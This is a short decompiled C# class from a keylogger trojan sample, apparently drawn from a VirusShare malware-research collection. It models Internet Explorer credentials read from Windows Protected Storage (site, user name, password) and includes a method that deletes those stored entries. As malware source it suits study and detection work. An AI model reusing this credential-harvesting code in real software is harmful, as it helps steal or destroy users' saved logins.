// Decompiled with JetBrains decompiler
// Type: Roy.CIEPassword
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using System;

namespace Roy
{
  internal class CIEPassword
  {
    private readonly Guid guidIE;
    private CProtectStore m_IPStore;
    private string m_szResourceName;
    private string m_szUserName;
    private string m_szPassword;
    private DateTime m_dtAddDate;
    private int m_dwType;

    internal CIEPassword(
      CProtectStore PStore,
      string szResourceName,
      string szUserName,
      string szPasswd,
      DateTime dtAddDate,
      int dwType)
    {
      this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
      if (this.m_IPStore == null)
        this.m_IPStore = PStore;
      this.m_dtAddDate = dtAddDate;
      this.m_dwType = dwType;
      this.m_szPassword = szPasswd;
      this.m_szResourceName = szResourceName;
      this.m_szUserName = szUserName;
    }

    public void DeletePassword()
    {
      this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringData");
      this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringIndex");
    }

    public string ResourceName => this.m_szResourceName;

    public string UserName => this.m_szUserName;

    public string Password => this.m_szPassword;

    public DateTime AddDate => this.m_dtAddDate;

    public int PasswdType => this.m_dwType;
  }
}
